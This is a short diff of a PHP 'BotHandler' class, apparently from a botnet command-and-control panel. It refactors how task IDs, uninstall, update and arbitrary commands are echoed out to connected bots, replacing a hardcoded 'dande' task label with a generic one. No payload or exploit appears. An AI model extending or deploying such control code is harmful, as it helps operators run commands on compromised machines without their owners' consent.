@@ -139,10 +139,8 @@ class BotHandler
 
                             if ($com["task"] == "uninstall") {
                                 echo $com["id"] . ";uninstall;uninstall";
-                            } elseif ($com["task"] == "update") {
-                                echo $com["id"] . ";update;". $com["command"];
                             } else {
-                                echo $com["id"] . ";dande;" . $com["command"];
+                                echo $com["id"] . ";".$com["task"].";" . $com["command"];
                             }
                             //send taskID
 
